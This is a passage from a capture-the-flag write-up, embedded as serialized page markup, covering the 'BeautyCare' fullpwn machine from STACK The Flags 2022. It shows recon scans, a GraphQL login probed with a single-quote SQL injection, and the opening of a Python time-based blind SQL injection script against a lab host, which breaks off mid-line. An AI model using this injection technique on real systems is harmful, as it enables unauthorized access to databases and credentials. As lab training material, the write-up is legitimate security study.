2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=\u003el(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let n of d(s))!m.call(a,n)\u0026\u0026n!==\"default\"\u0026\u0026l(a,n,{get:()=\u003es[n],enumerable:!(c=p(s,n))||c.enumerable});return a},g=a=\u003ek(t(l(a!=null?r(h(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((_,i)=\u003e{i.exports=_jsx_runtime});var y={};N(y,{default:()=\u003ew,frontmatter:()=\u003eb});var e=g(o()),b={title:\"STACK The Flags 2022 Open \\u2013 Fullpwn\",date:\"2022-12-05\",draft:!1,authors:[\"elleuch\"],tags:[\"STACK The Flags 2022\",\"fullpwn\",\"Electron\",\"XSS\",\"RCE\",\"Selenium\",\"HackTheBox\"],summary:\"Fullpwn Solutions from STACK The Flags CTF\"};function f(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",h3:\"h3\",p:\"p\",code:\"code\",pre:\"pre\",img:\"img\",blockquote:\"blockquote\",ol:\"ol\",li:\"li\",ul:\"ul\",h4:\"h4\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"beautycare-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#beautycare-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"BeautyCare (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We started with a simple \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the basic options:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:~ \\xBB nmap -sC -sV -v \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),\"  \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ssh\"}),\"     OpenSSH \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\".2p1 Ubuntu 4ubuntu0.5 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu Linux\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" protocol \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2.0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),\"  http    nginx \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1.18\"}),\".0 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Checking the Webserver running on port 80. We saw nothing interesting, pretty much everything is static and there is no leakage of a subdoamin/domain in the sources.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/beautycare-webpage.png\",alt:\"Beautycare Webpage\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Since there is no domain until now, we can proceed to fuzz for hidden directories with gobuster.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:~ \\xBB gobuster \",(0,e.jsx)(n.span,{className:\"token function\",children:\"dir\"}),` -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Gobuster v3.2.0-dev\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"by OJ Reeves \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"@TheColonial\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u0026\"}),\" Christian Mehlmauer \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"@firefart\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Url:                     http://10.129.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Method:                  GET\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Threads:                 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Negative Status codes:   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` User Agent:              gobuster/3.2.0-dev\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Timeout:                 10s\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),\"/12/05 02:50:25 Starting gobuster \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` directory enumeration mode\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/admin                \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Status: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"200\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"Size: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"863\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And we discovered that there is a hidden \",(0,e.jsx)(n.code,{children:\"/admin\"}),\" endpoint which is a simple admin login page.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-login.png\",alt:\"Admin Login\"})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried to login with some dummy/default credentials. But that didn\\u2019t help.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Checking Burp HTTP history for the requests:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\\\\\",password : \\\\\"admin\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.a,{href:\"https://graphql.org/\",children:\"GraphQL\"}),\" is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a \",(0,e.jsx)(n.code,{children:\"LoginUser\"}),\" function with the provided username and password. The function is expected to return a message and a token if the login is successful.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"mutation\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token property-query property-mutation\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"password\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token property\",children:\"message\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token property\",children:\"token\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The first thing I tried was introspection, which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn\\u2019t lead to anything.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Then, I\\u2019ve tried to add bad characters in the username field. Adding a single quote results in an interesting error:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:`\"admin'\\\\\",password : \\\\\"admin\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"`}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"It seems like the username field is vulnerable to an SQL injection. Since GraphQL is somehow interacting with the SQL database, We\\u2019ll not be able to bypass the login with it.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/trying-sqli-query.png\",alt:\"Trying Sqli Query\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"For the sake of this part, I\\u2019ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server. If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the \",(0,e.jsx)(n.code,{children:\"res\"}),\" string.In this case, I just guessed the table name and columns and I got a delay.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` requests\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` os\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:'#printable=\"a0123456789bcdefghijklmnopqrstuvwxyz\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"printable\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,e.jsx)(n.span,{className:\"token boolean\",children:\"True\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" char \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" printable\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.6\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        session \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" requests\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_url \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194:80/graphql\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_headers \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"User-Agent\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Content-Type\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"application/json\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token 